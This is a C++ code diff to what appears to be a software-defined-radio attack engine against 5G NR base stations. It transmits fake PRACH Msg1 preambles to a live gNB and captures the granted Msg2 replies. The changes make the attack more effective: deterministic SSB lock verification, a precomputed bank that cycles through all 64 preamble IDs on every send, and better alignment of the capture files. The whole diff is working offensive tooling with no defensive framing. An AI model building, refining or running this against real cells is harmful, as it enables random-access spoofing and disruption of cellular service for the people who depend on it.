@@ -65,6 +65,108 @@ static uint64_t burst_hash(const SampleBuffer& s)
   return h;
 }
 
+// Frame-ring accumulator for lock verification.
+//
+// The recv loop hands out small, sub-frame-sized windows; the grid SSB slot
+// (samples_per_slot long, one per frame) is only *fully* inside a given window
+// when the window start lands within (win_len - slot_len) samples before a
+// frame boundary — a ~2% phase lottery. The old verify path judged only those
+// lucky buffers, so verification came in bursts with multi-second dead gaps,
+// and on an underflowing gNB the miss streak in the gap falsely rejected a real
+// cell.
+//
+// This ring keeps the most recent contiguous stream so every grid slot can be
+// judged exactly once, the moment its last sample has arrived — deterministic,
+// one verify per frame, independent of window phase.
+//
+// Fixed-capacity circular buffer: N samples stay in place, only head/abs move,
+// so appending a chunk is O(n) with no memmove (the vector-of-growing-hostile
+// RX queue already has enough latency problems).
+class FrameRing {
+public:
+  void reserve(std::size_t cap)
+  {
+    if (cap_ >= cap) return;              // idempotent: keep the first sizing
+    data_.assign(cap, Sample{});
+    cap_ = cap;
+  }
+
+  void reset()
+  {
+    head_ = 0;
+    total_ = 0;
+    abs_start_ = 0;
+  }
+
+  void append(const Sample* src, std::size_t n, uint64_t chunk_abs)
+  {
+    if (n == 0 || cap_ == 0) return;
+    const uint64_t end = abs_start_ + total_;
+    if (total_ != 0 && chunk_abs > end) {
+      // A gap in the stream (lost packet): restart from this chunk.
+      reset();
+      abs_start_ = chunk_abs;
+    } else if (total_ == 0) {
+      abs_start_ = chunk_abs;
+    }
+
+    // Chunks may overlap the currently held tail (re-anchored timestamp/short
+    // recv): keep only samples beyond what we already hold.
+    uint64_t in_abs = chunk_abs;
+    std::size_t in = 0;
+    if (total_ != 0) {
+      const uint64_t have = abs_start_ + total_;
+      if (have > chunk_abs) {
+        const std::size_t skip =
+            static_cast<std::size_t>(have - chunk_abs);
+        if (skip >= n) return;                 // wholly inside held window
+        in_abs = have;
+        in = skip;
+      }
+    }
+
+    for (std::size_t i = in; i < n; ++i) {
+      data_[(head_ + total_) % cap_] = src[i];
+      ++total_;
+      if (total_ > cap_) {                     // slide the window forward
+        head_ = (head_ + 1) % cap_;
+        --total_;
+        ++abs_start_;
+      }
+    }
+  }
+
+  // Copies [from_abs, from_abs + len) into `out` iff fully held. Returns false
+  // if the range is not yet available (keep waiting) or already trimmed.
+  bool extract(uint64_t from_abs, std::size_t len, SampleBuffer& out) const
+  {
+    if (from_abs < abs_start_) return false;
+    const uint64_t rel = from_abs - abs_start_;
+    if (rel >= total_ || rel + len > total_) return false;
+    out.resize(len);
+    for (std::size_t i = 0; i < len; ++i) {
+      out[i] = data_[(head_ + static_cast<std::size_t>(rel) + i) % cap_];
+    }
+    return true;
+  }
+
+  uint64_t abs_start() const { return abs_start_; }
+  std::size_t size() const { return total_; }
+
+private:
+  std::vector<Sample> data_;
+  std::size_t cap_ = 0;
+  std::size_t head_ = 0;      // index of the oldest held sample in data_
+  std::size_t total_ = 0;     // valid samples held
+  uint64_t abs_start_ = 0;    // absolute sample index of the oldest held sample
+};
+
+// Samples the window must hold to extract one grid slot with lead-in: the
+// verify slice is [slot_start - kVerifyLead, slot_start + slot). Lead-in must
+// cover the PSS body offset (symbols 0..3 + CP of symbol 4) so locate_ssb()
+// can map the PSS peak back to a slot start inside the slice.
+static constexpr std::size_t kVerifyLead = 4096;
+
 static void log_attack(const AttackConfig& cfg, const RarEvent& ev, double advance_us, bool tx_ok)
 {
   auto& log = attack_log(cfg);
@@ -255,11 +357,11 @@ int AttackEngine::run_live()
     bool have_rx_time = false;
     double cfo_hz = 0.0;
     nr::PrachPreamble burst;
-    bool burst_built = false;
-    double built_cfo = 0.0;           // carrier offset baked into `burst`
-    unsigned built_rapid = 9999;      // RAPID baked into `burst` (rebuild on change)
+    nr::PrachBank prach_bank;
     uint32_t dither_idx = 0;          // advances one step per sent occasion
     uint64_t last_refine_slot = ~0ull;// frame-slot-0 we last CFO-refined on
+    FrameRing frame_ring;             // contiguous stream for deterministic verify
+    uint64_t last_verify_abs = ~0ull;  // abs sample of the last judged grid slot
     constexpr uint32_t kCfoAccumFrames = 6;  // SSB frames to average before burst use
     constexpr double kMinPrachLeadSec = 0.001;  // UHD timed TX anchor lead
     uint64_t last_armed_slot = ~0ull;
@@ -292,14 +394,45 @@ int AttackEngine::run_live()
       }
       sync.set_rx_now(rx_global_sample);
 
+      if (getenv("GONE_DUMP_SSB")) {
+        static std::ofstream stream("/tmp/live_stream.cf32",
+                                     std::ios::binary | std::ios::app);
+        static uint64_t wrote = 0;
+        stream.write(reinterpret_cast<const char*>(buf.data()),
+                     static_cast<std::streamsize>(buf.size() * sizeof(Sample)));
+        wrote += buf.size();
+        if (wrote >= 2u * 230400u) {
+          std::cerr << "[dbg] live stream " << (wrote / 1000) << "k samples written\n";
+          stream.close();
+          unsetenv("GONE_DUMP_SSB");
+        }
+      }
+
       // Acquire / hold the frame lock from the SSB in the stream. Throttled:
       // the sliding PSS corr is the expensive step and the RX queue is fragile
       // (every extra ~100 ms of processing shows up as overshoot/stall).
+      //
+      // recv_timed() may return fewer than buf.size() samples (RX overflow);
+      // the tail then holds STALE samples from a previous read, so a bogus PSS
+      // peak can land past the real data and hand a spurious (weak) lock. Scan
+      // only the n freshly-received samples.
+      SampleBuffer scan_buf;
+      const SampleBuffer* iq_for_ssb = &buf;
+      if (n > 0 && n < buf.size()) {
+        scan_buf.assign(buf.begin(), buf.begin() + static_cast<ptrdiff_t>(n));
+        iq_for_ssb = &scan_buf;
+      }
       if (have_rx_time && !sync.locked() && (rounds % 4u) == 0u) {
         SsbResult res;
-        if (sync.find_ssb(buf, res)) {
+        if (sync.find_ssb(*iq_for_ssb, res)) {
           sync.set_frame_start_global(rx_global_sample + res.slot_start);
           cfo_hz = res.cfo_hz;
+          frame_ring.reset();
+          // Ring must hold one full frame so every grid slot has a contiguous
+          // window to be extracted from (frame_samples() = 20 ms * rate).
+          frame_ring.reserve(
+              static_cast<std::size_t>(sync.frame_samples() + sync.samples_per_slot() + kVerifyLead));
+          last_verify_abs = ~0ull;
           std::printf("%s [live] SSB lock: frame_start=%llu strength=%.3f cfo=%.1fHz "
                       "(cfomag=%.2g) k_ssb=%d pss=%.3f@%+d sss=%.3f@%+d\n",
                       wall_ts().c_str(),
@@ -314,13 +447,38 @@ int AttackEngine::run_live()
       // until the SSB reproduces on the 20 ms frame grid for kVerifyHitsNeeded
       // frames. Without this a dead cell still hands a spurious lock and the
       // run blind-fires preambles into the void (observed in run g16).
-      const auto cur_g = sync.current_slot();
-      if (cur_g && ((*cur_g % 20u) == 0u) && *cur_g != last_refine_slot &&
-          sync.verify_in_progress()) {
+      //
+      // Deterministic judge, not a phase lottery: every recv chunk appends to
+      // a frame-sized ring of the contiguous stream, and each grid slot is
+      // verified exactly once — the moment its last sample arrives. The old
+      // path only judged the ~2% of 16384-sample windows that happened to fully
+      // contain the slot, giving bursts of verifies with multi-second dead gaps
+      // in which a real-but-underflowing cell was falsely rejected.
+      if (n > 0 && sync.verify_in_progress()) {
+        frame_ring.append(buf.data(), n, rx_global_sample);
+      }
+      while (sync.verify_in_progress()) {
+        const uint64_t slot =
+            static_cast<uint64_t>(sync.samples_per_slot() + 0.5);
+        const uint64_t ring_start = frame_ring.abs_start();
+        const uint64_t ring_end = ring_start + frame_ring.size();
+        // Never judge before the lead-in has streamed in. After a RX gap the
+        // ring restarts and ring_start jumps past the last judged slot, so push
+        // the search base forward instead of waiting on a slot already trimmed.
+        uint64_t search_from = ring_start + kVerifyLead;
+        if (last_verify_abs != ~0ull)
+          search_from = std::max(search_from, last_verify_abs + 1);
+        const uint64_t cand = sync.next_grid_slot_after(search_from);
+        if (last_verify_abs != ~0ull && cand <= last_verify_abs)
+          break;                                          // safety: no forward move
+        if (cand + slot > ring_end) break;                // slot not fully streamed
+        SampleBuffer slice;
+        if (!frame_ring.extract(cand - kVerifyLead, kVerifyLead + slot, slice))
+          break;
+        last_verify_abs = cand;
         const uint64_t tol =
             static_cast<uint64_t>(3.0 * sync.samples_per_slot() + 0.5);
-        const CellSync::VerifyEvent ev =
-            sync.verify_frame(buf, rx_global_sample, tol);
+        const CellSync::VerifyEvent ev = sync.verify_frame(slice, cand - kVerifyLead, tol);
         if (ev == CellSync::VerifyEvent::Confirmed) {
           std::printf("%s [live] lock CONFIRMED: SSB reproduced on frame grid — TX enabled\n",
                       wall_ts().c_str());
@@ -329,7 +487,6 @@ int AttackEngine::run_live()
                       "frame grid (no cell?) — rescanning, NO TX\n",
                       wall_ts().c_str());
         }
-        last_refine_slot = *cur_g;
       }
       if (!sync.locked() || sync.verify_in_progress()) { ++rounds; continue; }
 
@@ -373,35 +530,30 @@ int AttackEngine::run_live()
              static_cast<unsigned>(sent % 64u)) % 64u
           : static_cast<unsigned>(cfg_.prach.rapid);
 
-      // (Re)build the Msg1 burst only when the effective carrier/rapid changed.
-      if (!burst_built || std::abs(eff_cfo - built_cfo) > 250.0 ||
-          rapid_eff != built_rapid) {
-        const uint16_t prbs = static_cast<uint16_t>(std::min(
-            51, static_cast<int>(cfg_.bandwidth_mhz * 1000.0 /
-                                 (12.0 * static_cast<double>(cfg_.scs_khz)))));
-        burst = nr::synth_prach_b4(cfg_.prach.root_sequence_index, rapid_eff,
-                                   prbs, cfg_.scs_khz * 1000.0, cfg_.sample_rate,
-                                   cfg_.prach.msg1_frequency_start_prb, eff_cfo);
-        if (burst.samples.empty()) {
-          std::cerr << "[live] Msg1 burst synthesis failed\n";
-          return 1;
-        }
+      // Precompute the full 64-rapid bank once per (root, cfo, prbs) set;
+      // per-send is an O(1) copy. With cycle_rapids every send claims a new
+      // rapid, so a per-send synth_prach_b4() rebuild (64-pt IFFT + NCO ramp)
+      // stalls the RX drain for ~ms and starves the RAR-window capture.
+      const uint16_t prbs = static_cast<uint16_t>(std::min(
+          51, static_cast<int>(cfg_.bandwidth_mhz * 1000.0 /
+                              (12.0 * static_cast<double>(cfg_.scs_khz)))));
+      if (!prach_bank.matches(cfg_.prach.root_sequence_index, prbs,
+                              cfg_.scs_khz * 1000.0, cfg_.sample_rate,
+                              cfg_.prach.msg1_frequency_start_prb, eff_cfo)) {
+        prach_bank.build(cfg_.prach.root_sequence_index, prbs,
+                         cfg_.scs_khz * 1000.0, cfg_.sample_rate,
+                         cfg_.prach.msg1_frequency_start_prb, eff_cfo);
+        burst = prach_bank.get(rapid_eff);
         double rms = 0.0;
         for (const auto& v : burst.samples) rms += std::norm(v);
         rms = std::sqrt(rms / burst.samples.size());
-        if (!burst_built) {
-          std::printf("%s [live] preamble: %zu samples (%.0f us) f0_bin=%lld "
-                      "cfo_comp=%.0f Hz resid=%+.1f Hz hash=%016llx rms=%.3f\n",
-                      wall_ts().c_str(),
-                      burst.samples.size(), burst.duration_sec * 1e6,
-                      static_cast<long long>(burst.f0_bin), eff_cfo,
-                      burst.cfo_residual_hz,
-                      static_cast<unsigned long long>(burst_hash(burst.samples)),
-                      rms);
-        }
-        built_cfo = eff_cfo;
-        built_rapid = rapid_eff;
-        burst_built = true;
+        std::printf("%s [prach] preamble bank: 64 rapids @ cfo=%.0f Hz "
+                    "f0_bin=%lld resid=%+.1f Hz rms=%.3f\n",
+                    wall_ts().c_str(), eff_cfo,
+                    static_cast<long long>(burst.f0_bin),
+                    burst.cfo_residual_hz, rms);
+      } else {
+        burst = prach_bank.get(rapid_eff);
       }
 
       // Arm the next PRACH occasion against the LIVE device clock (the RX
@@ -465,10 +617,13 @@ int AttackEngine::run_live()
       // Fire: a strong hit inside the reply window after OUR occasion is the
       // Msg2 the gNB granted to our fake Msg1. P2-5 gates on RAR-window
       // membership (never on a learned SIB bucket — firing stays honest even
-      // when SIB1 happens to sit inside the window).
+      // when SIB1 happens to sit inside the window). The fence is the grid's
+      // null-calibrated fire_floor(), not an absolute 0.9 (which a
+      // max-of-extreme grid correlation reaches on empty captures).
       if (last_occ_slot != ~0ull) {
+        const float fire_fence = std::max(cfg_.live_fire_corr, mon.fire_floor());
         for (const auto& h : hits) {
-          if (h.corr < cfg_.live_fire_corr) continue;
+          if (h.corr < fire_fence) continue;
           if (h.abs_slot <= last_occ_slot ||
               h.abs_slot > last_occ_slot + kRarWindowSlots) continue;
           if (h.abs_slot == last_fired_abs_slot) continue;   // multi-config dedupe
@@ -563,13 +718,13 @@ int AttackEngine::run_prach()
     bool have_rx_time = false;
     double cfo_hz = 0.0;
     nr::PrachPreamble burst;
-    bool burst_built = false;
-    double built_cfo = 0.0;         // carrier offset baked into `burst`
-    unsigned built_rapid = 9999;      // RAPID baked into `burst` (rebuild on change)
+    nr::PrachBank prach_bank;
     double last_tx_cfo = 0.0;       // offset of the most recent transmitted burst
-    uint32_t dither_idx = 0;        // advances one step per sent occasion
-    uint64_t dither_passes = 0;     // completed full dither sweeps
+uint32_t dither_idx = 0;        // advances one step per sent occasion
+    uint32_t dither_passes = 0;     // completed full dither sweeps
     uint64_t last_refine_slot = ~0ull; // frame-slot-0 we last CFO-refined on
+    FrameRing frame_ring;           // contiguous stream for deterministic verify
+    uint64_t last_verify_abs = ~0ull;  // abs sample of the last judged grid slot
     constexpr uint32_t kCfoAccumFrames = 6;  // SSB frames to average before burst use
     uint64_t last_armed_slot = ~0ull;
     bool armed_any = false;
@@ -577,7 +732,7 @@ int AttackEngine::run_prach()
     // RAR-window OTA capture (offline decode of the gNB's Msg2).
     bool capture_armed = false;         // target occasion fixed for a window
     bool tail_armed = false;            // post-count tail recording (once/run)
-    bool capture_done = false;          // capture exactly one RAR window per run
+    bool capture_done = false;          // capture windows per sent occasion (see below)
     uint64_t capture_from = 0;          // absolute sample where the RAR window starts
     uint64_t captured = 0;              // samples written so far (this attempt)
     uint64_t capture_win_samples = 0;   // window length in samples (this attempt)
@@ -607,15 +762,29 @@ int AttackEngine::run_prach()
       }
       sync.set_rx_now(rx_global_sample);
 
+      // recv_timed() may return fewer than buf.size() samples (RX overflow);
+      // the tail then holds STALE samples from a previous read, so a bogus PSS
+      // peak can land past the real data and hand a spurious (weak) lock. Scan
+      // only the n freshly-received samples.
+      SampleBuffer scan_buf;
+      const SampleBuffer* iq_for_ssb = &buf;
+      if (n > 0 && n < buf.size()) {
+        scan_buf.assign(buf.begin(), buf.begin() + static_cast<ptrdiff_t>(n));
+        iq_for_ssb = &scan_buf;
+      }
       if (have_rx_time && !sync.locked() && (rounds % 4u) == 0u) {
         // Throttled: sliding PSS corr costs ~50-200 ms per buffer against
         // 0.7 ms of air, so searching every buffer explodes the RX queue
         // (the ~1 s lags + early overflow jumps that trim captures). Every
         // 4th buffer still locks within a few SSB periods.
         SsbResult res;
-        if (sync.find_ssb(buf, res)) {
+        if (sync.find_ssb(*iq_for_ssb, res)) {
           sync.set_frame_start_global(rx_global_sample + res.slot_start);
           cfo_hz = res.cfo_hz;
+          frame_ring.reset();
+          frame_ring.reserve(
+              static_cast<std::size_t>(sync.frame_samples() + sync.samples_per_slot() + kVerifyLead));
+          last_verify_abs = ~0ull;
           // framemod pins the lock to the 20 ms frame: runs whose working
           // occasion_slot differs must show framemod differing by exactly the
           // slot delta x slot length (beam lottery), else the model is wrong.
@@ -637,13 +806,32 @@ int AttackEngine::run_prach()
 
       // Two-phase lock verification (see run_live): a candidate lock must
       // reproduce the SSB on the frame grid before the [prach] loop TXes.
-      const auto cur_g = sync.current_slot();
-      if (cur_g && ((*cur_g % 20u) == 0u) && *cur_g != last_refine_slot &&
-          sync.verify_in_progress()) {
+      // Deterministic frame-ring judge (not a window-phase lottery): see run_live.
+      if (n > 0 && sync.verify_in_progress()) {
+        frame_ring.append(buf.data(), n, rx_global_sample);
+      }
+      while (sync.verify_in_progress()) {
+        const uint64_t slot =
+            static_cast<uint64_t>(sync.samples_per_slot() + 0.5);
+        const uint64_t ring_start = frame_ring.abs_start();
+        const uint64_t ring_end = ring_start + frame_ring.size();
+        // Never judge before the lead-in has streamed in. After a RX gap the
+        // ring restarts and ring_start jumps past the last judged slot, so push
+        // the search base forward instead of waiting on a slot already trimmed.
+        uint64_t search_from = ring_start + kVerifyLead;
+        if (last_verify_abs != ~0ull)
+          search_from = std::max(search_from, last_verify_abs + 1);
+        const uint64_t cand = sync.next_grid_slot_after(search_from);
+        if (last_verify_abs != ~0ull && cand <= last_verify_abs)
+          break;                                          // safety: no forward move
+        if (cand + slot > ring_end) break;                // slot not fully streamed
+        SampleBuffer slice;
+        if (!frame_ring.extract(cand - kVerifyLead, kVerifyLead + slot, slice))
+          break;
+        last_verify_abs = cand;
         const uint64_t tol =
             static_cast<uint64_t>(3.0 * sync.samples_per_slot() + 0.5);
-        const CellSync::VerifyEvent ev =
-            sync.verify_frame(buf, rx_global_sample, tol);
+        const CellSync::VerifyEvent ev = sync.verify_frame(slice, cand - kVerifyLead, tol);
         if (ev == CellSync::VerifyEvent::Confirmed) {
           std::printf("%s [prach] lock CONFIRMED: SSB reproduced on grid — TX enabled\n",
                       wall_ts().c_str());
@@ -652,7 +840,6 @@ int AttackEngine::run_prach()
                       "frame grid (no cell?) — rescanning, NO TX\n",
                       wall_ts().c_str());
         }
-        last_refine_slot = *cur_g;
       }
       if (!sync.locked() || sync.verify_in_progress()) { ++rounds; continue; }
 
@@ -709,38 +896,33 @@ int AttackEngine::run_prach()
              static_cast<unsigned>(sent % 64u)) % 64u
           : static_cast<unsigned>(cfg_.prach.rapid);
 
-      // (Re)build the burst only when the effective carrier actually changed.
-      if (!burst_built || std::abs(eff_cfo - built_cfo) > 250.0 ||
-          rapid_eff != built_rapid) {
-        const uint16_t prbs = static_cast<uint16_t>(std::min(
-            51, static_cast<int>(cfg_.bandwidth_mhz * 1000.0 /
-                                 (12.0 * static_cast<double>(cfg_.scs_khz)))));
-        burst = nr::synth_prach_b4(cfg_.prach.root_sequence_index, rapid_eff,
-                                   prbs, cfg_.scs_khz * 1000.0, cfg_.sample_rate,
-                                   cfg_.prach.msg1_frequency_start_prb, eff_cfo);
-        if (burst.samples.empty()) {
-          std::cerr << "[prach] burst synthesis failed\n";
-          return 1;
-        }
+      // Full 64-rapid bank, built once per (root, cfo, prbs) set — per-send is
+      // an O(1) copy. With cycle_rapids every send claims a new rapid, so a
+      // per-send synth_prach_b4() rebuild (64-pt IFFT + NCO ramp, ~ms) stalls
+      // the RX drain and the RAR-window capture starves (see PrachBank).
+      const uint16_t prbs = static_cast<uint16_t>(std::min(
+          51, static_cast<int>(cfg_.bandwidth_mhz * 1000.0 /
+                              (12.0 * static_cast<double>(cfg_.scs_khz)))));
+      if (!prach_bank.matches(cfg_.prach.root_sequence_index, prbs,
+                              cfg_.scs_khz * 1000.0, cfg_.sample_rate,
+                              cfg_.prach.msg1_frequency_start_prb, eff_cfo)) {
+        prach_bank.build(cfg_.prach.root_sequence_index, prbs,
+                         cfg_.scs_khz * 1000.0, cfg_.sample_rate,
+                         cfg_.prach.msg1_frequency_start_prb, eff_cfo);
+        burst = prach_bank.get(rapid_eff);
         double pk = 0.0, rms = 0.0;
         for (const auto& v : burst.samples) {
           pk = std::max(pk, (double)std::abs(v));
           rms += std::norm(v);
         }
         rms = std::sqrt(rms / burst.samples.size());
-        if (!burst_built) {
-          std::printf("%s [prach] preamble: %zu samples (%.0f us) f0_bin=%lld "
-                      "cfo_comp=%.0f Hz resid=%+.1f Hz hash=%016llx rms=%.3f peak=%.3f\n",
-                      wall_ts().c_str(),
-                      burst.samples.size(), burst.duration_sec * 1e6,
-                      static_cast<long long>(burst.f0_bin), eff_cfo,
-                      burst.cfo_residual_hz,
-                      static_cast<unsigned long long>(burst_hash(burst.samples)),
-                      rms, pk);
-        }
-        built_cfo = eff_cfo;
-        built_rapid = rapid_eff;
-        burst_built = true;
+        std::printf("%s [prach] preamble bank: 64 rapids @ cfo=%.0f Hz "
+                    "f0_bin=%lld resid=%+.1f Hz rms=%.3f peak=%.3f\n",
+                    wall_ts().c_str(), eff_cfo,
+                    static_cast<long long>(burst.f0_bin),
+                    burst.cfo_residual_hz, rms, pk);
+      } else {
+        burst = prach_bank.get(rapid_eff);
       }
 
       // Arm the next PRACH occasion against the LIVE device clock, not the
@@ -888,6 +1070,13 @@ int AttackEngine::run_prach()
           // actually-used CFO is already printed on the arm line.
           if (!cfg_.prach.rar_capture_dir.empty() && !capture_done && !capture_armed &&
             armed_any && sent >= 1) {
+            // One wide RAR-window file per run, anchored on the FIRST granted
+            // occasion (the comb is hottest at run start — observed metric
+            // 17.7 here). The window must be WIDE (~2.5 s): the stalled RX
+            // pipeline strides ~0.29 s past the capture head per buffer, so a
+            // tight 16-slot window is ALWAYS overshot before the RAR lands and
+            // the file ends up 2-slot trash. drain_sec/tail capture the later
+            // backlog.
             // RX stamps ARE device time (recv_timed returns UHD's per-buffer
             // time spec), so the air event at the occasion sits at rx-sample
             // == occ — there is NO pipeline offset to subtract. Subtracting
@@ -972,18 +1161,35 @@ int AttackEngine::run_prach()
         } else if (buf_end > t_start) {
           const uint64_t lo = buf_start > t_start ? buf_start : t_start;
           const uint64_t hi = buf_end < t_end ? buf_end : t_end;
-          if (captured == 0) capture_file_start = lo;
-          // A mid-file time gap (overflow jump) would otherwise be written
-          // contiguously and silently corrupt slot alignment offline: mark it.
+          // The file's true sample 0 is CAPTURE_FROM, pinned at arm time from
+          // the occasion slot — NEVER re-anchored to the first writing buffer.
+          // If the RX head lurches forward while the loop is stalled, the first
+          // buffer can already be ~5e6 samples past capture_from; anchoring the
+          // file there shifts every offline --start offset (slot-based, from the
+          // occasion) by that whole lurch onto garbage (observed: armed abs
+          // 442147183, file silently anchored 447697745 -> all decodes zero).
+          //
+          // Invariant: file sample k == abs(capture_file_start + k). Any gap
+          // (real RX drop OR the head lurch above) is zero-padded so slot
+          // alignment survives; the decoder just sees a near-zero region there
+          // (corr ~0) instead of silently-shifted data. This also kills the
+          // pathological "gap grows by exactly one buffer per read" drift:
+          // captured now tracks file length, expected always == captured.
           const uint64_t expected = capture_file_start + captured;
-          if (lo != expected) {
+          if (lo > expected) {
             ++capture_gaps;
-            if (lo > expected) capture_gap_samples += lo - expected;
-            std::printf("%s [prach] RAR capture: gap of %lld samples before abs %llu "
-                        "(attempt %llu)\n",
+            capture_gap_samples += lo - expected;
+            std::printf("%s [prach] RAR capture: gap of %lld samples before abs "
+                        "%llu zero-padded (attempt %llu)\n",
                         wall_ts().c_str(), (long long)lo - (long long)expected,
                         (unsigned long long)lo,
                         static_cast<unsigned long long>(capture_attempt));
+            const uint64_t pad = lo - expected;
+            static const Sample kZero = Sample{0.f, 0.f};
+            std::vector<Sample> zeros(static_cast<std::size_t>(pad), kZero);
+            cap_file.write(reinterpret_cast<const char*>(zeros.data()),
+                           static_cast<std::streamsize>(pad * sizeof(Sample)));
+            captured += pad;
           }
           // Contiguous span write (buf holds complex<float> = interleaved cf32).
           // Never rewrite already-written samples: a backtracked buffer
